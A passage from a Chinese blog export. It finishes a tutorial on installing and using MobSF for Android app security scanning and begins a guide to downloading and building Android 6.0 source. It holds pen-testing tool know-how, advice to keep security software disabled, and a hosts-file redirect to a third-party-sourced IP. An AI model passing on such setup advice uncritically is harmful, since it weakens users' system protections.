class=\"line\">jdk 1.8.0</span><br></pre></td></tr></table></figure>\n\n<p>安装要求</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装 Git：https:<span class=\"comment\">//git-scm.com/download/win</span></span><br><span class=\"line\">安装 Python3<span class=\"number\">.7</span>（<span class=\"number\">3.8</span>会出现错误)：https:<span class=\"comment\">//www.python.org/ftp/python/3.7.9/python-3.7.9-amd64.exe</span></span><br><span class=\"line\">安装 JDK <span class=\"number\">8</span>+：https:<span class=\"comment\">//www3.ntu.edu.sg/home/ehchua/programming/howto/JDK_Howto.html</span></span><br><span class=\"line\">安装  Microsoft Visual C++ Build Tools: https:<span class=\"comment\">//visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=BuildTools&amp;rel=16</span></span><br><span class=\"line\">安装  OpenSSL: https:<span class=\"comment\">//slproweb.com/products/Win32OpenSSL.html</span></span><br><span class=\"line\">安装  wkhtmltopdf: https:<span class=\"comment\">//wkhtmltopdf.org/downloads.html //wkhtmltopdf主要是为了将生成的报告转换成pdf版本</span></span><br><span class=\"line\">wkhtmltopdf 操作指南：https:<span class=\"comment\">//github.com/JazzCore/python-pdfkit/wiki/Installing-wkhtmltopdf</span></span><br><span class=\"line\">将包含 wkhtmltopdf 二进制文件的文件夹添加到环境变量PATH</span><br></pre></td></tr></table></figure>\n\n<p>安装步骤：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">步骤<span class=\"number\">1</span>：下载好项目之后，可以重命名项目文件夹名称MobSf，打开cmd窗口进入该项目目录。将项目内的requirements.txt打开，最后一行libsast==<span class=\"number\">1.2</span><span class=\"number\">.2</span>改为libsast==<span class=\"number\">1.3</span><span class=\"number\">.4</span> </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">步骤<span class=\"number\">2</span>：安装OpenSSL和wkhtmltopdf，并配置好wkhtmltopdf环境后，我们在终端进入文件夹，然后运行run.bat</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">步骤<span class=\"number\">3</span>：我们打开浏览器，在输入网址：<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">8000</span>，如果需要修改默认端口，可以在run.bat中修改SET conf=<span class=\"string\">&quot;0.0.0.0:8000&quot;</span>中的端口号</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/23.png\" alt=\"image-20210903125716878\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/24.png\" alt=\"image-20210903125748945\"></p>\n<p>一般我们在运行的时候，会出现一些报错，例如：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/25.png\" alt=\"image-20210903125841996\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">原因解析：</span><br><span class=\"line\">\t由于众所周知的网络原因，导致无法访问一些域名如raw.githubusercontent.com这个域名</span><br><span class=\"line\">\t解决办法：</span><br><span class=\"line\">\t步骤1：通过IPAddress.com首页，输入raw.githubusercontent.com查询到真实IP地址如：185.199.108.133</span><br><span class=\"line\">\t步骤2：在本地电脑host文件中添加记录185.199.108.133 raw.githubusercontent.com即可</span><br></pre></td></tr></table></figure>\n\n<p>例如：IPAddress.com首页</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/26.png\" alt=\"image-20210903130404834\"></p>\n<p>然后我们进入C:\\WINDOWS\\system32\\drivers\\etc ,修改hosts文件并保存</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/27.png\" alt=\"image-20210903130536306\"></p>\n<p>然后我们重新启动run.bat，再输入127.0.0.1，就可以发现正常的进入不报错误</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/28.png\" alt=\"image-20210903130713504\"></p>\n<p>同理在后面访问过程中，出现类似错误按照此解决方案就可以解决</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/29.png\" alt=\"image-20210903131022264\"></p>\n<p>但是由于这一般是由于网络受限原因导致，所以可能改了仍然会存在报错，但是一般不会影响正常使用，要彻底解决可以修改代码，大家可以尝试一下</p>\n<p><strong>docker安装：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）下载镜像：docker pull opensecurity/mobile-security-framework-mobsf</span><br><span class=\"line\">（2）启动容器：docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考网址：</span><br><span class=\"line\">https:<span class=\"comment\">//www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/#0x01-%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>Linux安装：</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">参考网址：https:<span class=\"comment\">//blog.csdn.net/Alexhcf/article/details/107438583</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>Mac安装:</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">安装环境：</span><br><span class=\"line\">Mac OS <span class=\"number\">10.14</span></span><br><span class=\"line\">Python <span class=\"number\">3.8</span></span><br><span class=\"line\">java <span class=\"number\">12.0</span><span class=\"number\">.2</span></span><br><span class=\"line\">MobSF v3<span class=\"number\">.1</span> beta</span><br><span class=\"line\">安装步骤：</span><br><span class=\"line\">参考网址：http:<span class=\"comment\">//www.51ste.com/share/det-5952.html</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）基本使用-2\"><a href=\"#（4）基本使用-2\" class=\"headerlink\" title=\"（4）基本使用\"></a>（4）基本使用</h4><p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/30.png\" alt=\"image-20210903131925360\"></p>\n<p>我们直接拖入一个APP开始分析：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/32.png\" alt=\"image-20210903132056941\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/31.png\" alt=\"image-20210903132027761\"></p>\n<p>我们可以看见APP正在进行逆向分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/33.png\" alt=\"image-20210903132200502\"></p>\n<p><strong>静态分析：</strong></p>\n<p>我们点击最近扫描就可以看见我们最近扫描的一些APP情况：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/34.png\" alt=\"image-20210903132445977\"></p>\n<p>我们随便点击一个应用的静态报告，就可以看见详细的静态分析结果</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/35.png\" alt=\"image-20210903133349135\"></p>\n<p><strong>动态分析：</strong></p>\n<p>我们需要安装Genymotion并注册账号，创建一个模拟器，这里我创建的是7.0模拟器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Genymotion官方地址：https:<span class=\"comment\">//www.genymotion.com/download/</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/36.png\" alt=\"image-20210903133349135\"></p>\n<p>我们启动创建的模拟器</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/37.png\" alt=\"image-20210903134450994\"></p>\n<p>然后重新启动MobSF,在平台上点击Dynamic Analyzer发现新的内容,点击MobSFy Android Runtime给模拟器安装插件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/38.png\" alt=\"image-20210903134624497\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/39.png\" alt=\"image-20210903135626110\"></p>\n<p>然后我们点击动态分析，开始进行动态分析</p>\n<p>在这个过程中，我们可能会遇到各种错误，这里我们依次来解决：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">问题<span class=\"number\">1</span>：Genymotion模拟器无法联网问题：</span><br><span class=\"line\">\t我们需要去检测Genymotion模拟器的相关配置，具体解决方案参考：https:<span class=\"comment\">//www.jianshu.com/p/ecb88d6bd815</span></span><br><span class=\"line\">问题<span class=\"number\">2</span>：废话不多说、电脑上的<span class=\"number\">360</span>管家等最好关闭，虽然这里不一定是这个导致，不过作为一名逆向人员，最好不要打开这些管家</span><br><span class=\"line\">问题<span class=\"number\">3</span>：安装Genymotion时，需要将VirusBox安装到默认路径下，不然会报错，安装后重启电脑</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/43.png\" alt=\"image-20210903172351260\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/40.png\" alt=\"image-20210903171425268\"></p>\n<p>点击start Instrumentation 开始自动化的遍历扫描</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/44.png\" alt=\"image-20210903172517016\"></p>\n<p>我们还可以实时查看API监测情况：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/42.png\" alt=\"image-20210903172556551\"></p>\n<p>然后我们产生动态分析报告</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug1/45.png\" alt=\"image-20210903172736972\"></p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><p>本文针对Android APP漏洞做了一个初步的介绍，先调研了当下的一些主流漏洞，以及常见的Android APP端漏洞挖掘方式，还结合APP漏洞审计系统，详细的列出了当下Android APP端漏洞挖掘的初步思路，为漏洞挖掘安全人员提供一个参考。</p>\n<p>本文还介绍了Android APP漏洞挖掘过程中的三种常用的工具drozer+Inspeckage(Xposed)+MobSF，详细介绍了三种工具的安装和具体使用教程，能很好的帮助Android 漏洞挖掘和渗透测试人员的工作。</p>\n<h2 id=\"五、参考网址\"><a href=\"#五、参考网址\" class=\"headerlink\" title=\"五、参考网址\"></a>五、参考网址</h2><p>Android APP漏洞：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">《移动应用安全形势报告》（<span class=\"number\">2020</span>）：https:<span class=\"comment\">//www.isc.org.cn/zxzx/xhdt/listinfo-40058.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class=\"line\">https:<span class=\"comment\">//xuanxuanblingbling.github.io/ctf/android/2018/02/12/Android_app_part1/</span></span><br></pre></td></tr></table></figure>\n\n<p>drozer：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//labs.f-secure.com/tools/drozer/</span></span><br><span class=\"line\">http:<span class=\"comment\">//rui0.cn/archives/30</span></span><br><span class=\"line\">http:<span class=\"comment\">//www.feidao.site/wordpress/?p=3438</span></span><br></pre></td></tr></table></figure>\n\n<p>Inspeckage:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.e-learn.cn/topic/3470422</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/tom__chen/article/details/78216732</span></span><br><span class=\"line\">https:<span class=\"comment\">//repo.xposed.info/module/mobi.acpm.inspeckage</span></span><br></pre></td></tr></table></figure>\n\n<p>MobSF:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:<span class=\"comment\">//www.codeleading.com/article/13073244765/</span></span><br><span class=\"line\">https:<span class=\"comment\">//blog.csdn.net/Alexhcf/article/details/107438583</span></span><br><span class=\"line\">https:<span class=\"comment\">//github.com/MobSF/Mobile-Security-Framework-MobSF</span></span><br><span class=\"line\">http:<span class=\"comment\">//www.51ste.com/share/det-5952-3.html</span></span><br><span class=\"line\">https:<span class=\"comment\">//bbs.pediy.com/thread-218973.htm</span></span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android源码定制（1）——Android6.0源码编译","url":"/2022/12/04/code1/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近在研究Xposed框架定制，恰好又看到看雪上两个大佬关于<a href=\"https://bbs.pediy.com/thread-255836.htm\">源码定制</a>和<a href=\"https://bbs.pediy.com/thread-255836.htm\">Xposed源码定制</a>的帖子，所以尝试基于Android6.0版本，详细记录一下从源码下载到Xposed框架定制的全过程。</p>\n<span id=\"more\"></span>\n<h2 id=\"二、Android-源码下载\"><a href=\"#二、Android-源码下载\" class=\"headerlink\" title=\"二、Android 源码下载\"></a>二、Android 源码下载</h2><h3 id=\"1-环境准备\"><a href=\"#1-环境准备\" class=\"headerlink\" title=\"1.环境准备\"></a>1.环境准备</h3><table>\n<thead>\n<tr>\n<th><strong>实验平台：</strong></th>\n<th>**Ubuntu 16.0.4  **</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>运行内存：</strong></td>\n<td><strong>(物理内存4G+交换内存8G)</strong></td>\n</tr>\n<tr>\n<td><strong>磁盘空间：</strong></td>\n<td><strong>300G</strong></td>\n</tr>\n</tbody></table>\n<h4 id=\"（1）内存配置\"><a href=\"#（1）内存配置\" class=\"headerlink\" title=\"（1）内存配置\"></a>（1）内存配置</h4><p>我们首先给虚拟机分配一个物理内存4G 然后设置虚拟内存8G，开始实验之前记得快照，考虑到源码编译可能需要很大的内存，我们提前配置好交换内存</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">（<span class=\"number\">1</span>）在Home目录创建一个大小为8G的swap文件</span><br><span class=\"line\">$ sudo dd <span class=\"keyword\">if</span>=/dev/zero of=/swapfile bs=1M count=8k  </span><br><span class=\"line\">注：从 /dev/zero 文件读出内容并存到/swapfile文件中，块大小为1MByte，总共 16K 个块，也就是总共 8GB</span><br><span class=\"line\">（<span class=\"number\">2</span>）格式化新增的swap文件：</span><br><span class=\"line\">$ sudo mkswap /swapfile</span><br><span class=\"line\">（<span class=\"number\">3</span>）启动新增的swap文件</span><br><span class=\"line\">$ sudo swapon /swapfile</span><br><span class=\"line\">（<span class=\"number\">4</span>）通过free命令就可以看到，swap分区增大了8G</span><br><span class=\"line\">$ free</span><br><span class=\"line\">（<span class=\"number\">5</span>）关闭新增的swap文件</span><br><span class=\"line\">$ sudo swapoff /swapfile</span><br><span class=\"line\"> 再次通过free命令就可以看到，swap分区减小了8G</span><br><span class=\"line\">（<span class=\"number\">6</span>）开机后自动启动新增的swap文件，在/etc/fstab中新增如下命令</span><br><span class=\"line\">$ vim /etc/fstab</span><br><span class=\"line\">/swapfile       none    swap    sw      <span class=\"number\">0</span>       <span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）磁盘扩展\"><a href=\"#（2）磁盘扩展\" class=\"headerlink\" title=\"（2）磁盘扩展\"></a>（2）磁盘扩展</h4><p>我们可以为虚拟机设置一个比较大的磁盘空间，但是如果你的虚拟机已经分配了一个磁盘空间，可能你需要扩展你的磁盘空间，这里可以详细参考<a href=\"https://blog.csdn.net/qq_37294163/article/details/106468619\">磁盘空间扩展</a>，去扩大你的虚拟机磁盘，这里最好保证自己的磁盘空间充足。</p>\n<h3 id=\"2-配置adb和fastboot\"><a href=\"#2-配置adb和fastboot\" class=\"headerlink\" title=\"2.配置adb和fastboot\"></a>2.配置adb和fastboot</h3><h4 id=\"（1）下载platform-tools压缩包\"><a href=\"#（1）下载platform-tools压缩包\" class=\"headerlink\" title=\"（1）下载platform-tools压缩包\"></a>（1）下载platform-tools压缩包</h4><p>我们到后面需要使用adb和fastboot，所以我们需要下载<a href=\"https://dl.google.com/android/repository/platform-tools_r30.0.5-linux.zip\">platform-tools资源包</a></p>\n<p>然后我们解压到自己的目录</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir -p /home/user/Android</span><br><span class=\"line\">unzip platform-tools_r30<span class=\"number\">.0</span><span class=\"number\">.5</span>-linux.zip  -d  /home/user/Android</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）配置环境变量\"><a href=\"#（2）配置环境变量\" class=\"headerlink\" title=\"（2）配置环境变量\"></a>（2）配置环境变量</h4><p>我们配置环境变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim  ~/.bashrc</span><br><span class=\"line\">添加：</span><br><span class=\"line\">#add Android Sdk  platform tools to path</span><br><span class=\"line\">#add START</span><br><span class=\"line\">export ADB_PATH=/home/tom/Android/platform-tools</span><br><span class=\"line\">export PATH=$PATH:$ADB_PATH</span><br><span class=\"line\">#add END</span><br><span class=\"line\">激活环境：</span><br><span class=\"line\">source ~/.bashrc </span><br></pre></td></tr></table></figure>\n\n<p>我们可以测试一下配置：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/36.png\" alt=\"image-20210926214750048\"></p>\n<h4 id=\"（3）安装repo命令\"><a href=\"#（3）安装repo命令\" class=\"headerlink\" title=\"（3）安装repo命令\"></a>（3）安装repo命令</h4><p>创建必要目录，git-repo工具保存目录，这里需要保存在bin目录下，不然后面可能出问题</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mkdir /home/tom/bin ##没有就创建</span><br></pre></td></tr></table></figure>\n\n<p>由于使用Google的repo源需要挂代理，所以我们使用清华的源repo源，无需挂代码就可以很快下载Android源码了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/git/git-repo -o /home/tom/bin/repo</span></span><br><span class=\"line\">cp repo ~/bin/ </span><br></pre></td></tr></table></figure>\n\n<p>后面是对应的repo保存路径</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/37.png\" alt=\"image-20210929092905942\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/38.png\" alt=\"image-20210929092947786\"></p>\n<p>设置权限：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod +x /home/tom/bin/repo</span><br></pre></td></tr></table></figure>\n\n<p>由于bin的环境变量已经配置过了，所以我们只需要去加入REPO_URL，来更新镜像源</p>\n<p>配置环境变量：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim  ~/.bashrc</span><br><span class=\"line\">##在bashrc中添加</span><br><span class=\"line\">export REPO_URL=<span class=\"string\">&#x27;https://mirrors.tuna.tsinghua.edu.cn/git/git-repo&#x27;</span></span><br><span class=\"line\">##激活环境变量</span><br><span class=\"line\">source  ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>配置环境变量或下载repo失败时，注意一下空格，大部分是此原因导致的</p>\n<h4 id=\"（4）下载源码\"><a href=\"#（4）下载源码\" class=\"headerlink\" title=\"（4）下载源码\"></a>（4）下载源码</h4><p>从<a href=\"https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/\">清华的镜像源官网</a>上我们可以看见有两种方法：</p>\n<h5 id=\"lt-1-gt-使用每月更新的初始化包\"><a href=\"#lt-1-gt-使用每月更新的初始化包\" class=\"headerlink\" title=\"&lt;1&gt;使用每月更新的初始化包\"></a>&lt;1&gt;使用每月更新的初始化包</h5><p>我们初始化代码仓库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /home/tom/SourceCode/</span><br></pre></td></tr></table></figure>\n\n<p>我们下载初始包，我们需要下载最新的aosp-latest.tar文件以及对应的md5值，<a href=\"https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/\">官方镜像网址</a></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/40.png\" alt=\"image-20210929103113870\"></p>\n<p>我们可以验证文件的完整性，进行MD5校验</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">md5sum aosp-latest.tar</span><br></pre></td></tr></table></figure>\n\n<p>下载完毕后可以使用tar -zxvf aosp-latest.jar指令解压该文件，解压出来文件夹名称为aosp，里面只有一个叫.repo的隐藏文件夹，该文件夹就是仓库，安卓源代码都在里面，可以使用CTRL+H来查看该隐藏文件夹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tar -zxvf aosp-latest.jar</span><br></pre></td></tr></table></figure>\n\n<p>然后我们只需要在目标文件夹下同步即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">repo sync</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-2-gt-传统的初始化方法\"><a href=\"#lt-2-gt-传统的初始化方法\" class=\"headerlink\" title=\"&lt;2&gt;传统的初始化方法\"></a>&lt;2&gt;传统的初始化方法</h5><p>我们进入我们的目标文件夹</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd SourceCode/Android6</span><br></pre></td></tr></table></figure>\n\n<p>然后我们初始化厂库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">repo init -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-6.0.1_r20</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/39.png\" alt=\"image-20210929102809637\"></p>\n<p>这里注意我们的每个分支应该根据我们的设备情况而选定，详细参考官网:<a href=\"https://source.android.com/source/build-numbers#source-code-tags-and-builds\">Android源码</a></p>\n<p>初始化成功后，系统将显示一条消息，告诉您 Repo 已在工作目录中完成初始化。客户端目录中现在应包含一个 <code>.repo</code> 目录，清单等文件将保存在该目录下</p>\n<p>同步源码树：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">repo sync</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（5）编写不死脚本\"><a href=\"#（5）编写不死脚本\" class=\"headerlink\" title=\"（5）编写不死脚本\"></a>（5）编写不死脚本</h4><p>由于我们在下载源码的过程中，时间太长可能会中途失败，所以我们需要编写不死脚本down.sh，保持运行</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">echo  <span class=\"string\">&quot;==========start repo sync===&quot;</span></span><br><span class=\"line\">repo init -u https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-6.0.1_r20</span></span><br><span class=\"line\">repo sync -j4 -d --force-sync --no-clone-bundle</span><br><span class=\"line\"><span class=\"keyword\">while</span> [ $? = <span class=\"number\">1</span> ]; <span class=\"keyword\">do</span>  </span><br><span class=\"line\">        echo “======sync failed, re-sync again======”  </span><br><span class=\"line\">        sleep <span class=\"number\">3</span>  </span><br><span class=\"line\">        repo sync -j4 -d --force-sync --no-clone-bundle</span><br><span class=\"line\">done </span><br></pre></td></tr></table></figure>\n\n<p>然后我们将down.sh启动</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod a+x down.sh</span><br><span class=\"line\">./down.sh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、Android-源码编译\"><a href=\"#三、Android-源码编译\" class=\"headerlink\" title=\"三、Android 源码编译\"></a>三、Android 源码编译</h2><h3 id=\"1-实验准备\"><a href=\"#1-实验准备\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><h4 id=\"（1）实验环境\"><a href=\"#（1）实验环境\" class=\"headerlink\" title=\"（1）实验环境\"></a>（1）实验环境</h4><p>由于关于源码下载的过程比较缓慢，这里方便实验，就不演示下载的流程了，这里会给大家在附件提供各个版本的android系统源码，方便大家进行实验，本文所需要的实验：</p>\n<table>\n<thead>\n<tr>\n<th><strong>实验平台：</strong></th>\n<th><strong>Ubuntu 16.0.4  (运行内存4GB+CPU 4+磁盘300G)</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Android源码：</strong></td>\n<td><strong>android-6.0.1_r1</strong></td>\n</tr>\n<tr>\n<td><strong>实验手机</strong></td>\n<td><strong>Google nexus5</strong></td>\n</tr>\n</tbody></table>\n<h4 id=\"（2）JDK配置\"><a href=\"#（2）JDK配置\" class=\"headerlink\" title=\"（2）JDK配置\"></a>（2）JDK配置</h4><p>我们在Android源码编译过程中，一定要注意对应Android版本的平台要求，和Android版本所需要的JDK版本，参考<a href=\"https://source.android.com/source/requirements\">官方网址</a>：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/12.png\" alt=\"image-20210926214750048\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/code1/13.png\" alt=\"image-20210926214816258\"></p>\n<h5 id=\"lt-1-gt-常见方法\"><a href=\"#lt-1-gt-常见方法\" class=\"headerlink\" title=\"&lt;1&gt; 常见方法\"></a>&lt;1&gt; 常见方法</h5><p>经过网上的资料查找，考虑到Ubuntu16仓库里面的镜像已经没有OpenJDK7的版本，所以要替换镜像源：</p>\n<p>首先进行备份一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo  cp   /etc/apt/sources.list   /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>\n\n<p>进行修改：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>\n\n<p>下面是一些镜像源：</p>\n<p>阿里源</p>\n<p><a href=\"https://developer.aliyun.com/mirror/ubuntu?spm=a2c6h.13651102.0.0.9c371b11kyC5Oh\">官方配置</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial main</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial main</span></span><br><span class=\"line\"></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-updates main</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-updates main</span></span><br><span class=\"line\"></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial universe</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial universe</span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-updates universe</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-updates universe</span></span><br><span class=\"line\"></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-security main</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-security main</span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-security universe</span></span><br><span class=\"line\">deb-src http:<span class=\"comment\">//mirrors.aliyun.com/ubuntu/ xenial-security universe</span></span><br></pre></td></tr></table></figure>\n\n<p>清华源</p>\n<p><a href=\"https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/\">官方配置</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span><br><span class=\"line\">deb https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class=\"line\"># deb-src https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse</span></span><br><span class=\"line\">deb https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class=\"line\"># deb-src https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse</span></span><br><span class=\"line\">deb https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class=\"line\"># deb-src https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse</span></span><br><span class=\"line\">deb https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class=\"line\"># deb-src https:<span class=\"comment\">//mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse</span></span><br><span class=\"line\"></span><br><span class=\"line\"># 预发布软件源，不建议启用</span><br><span class=\"line\"># deb https:<span 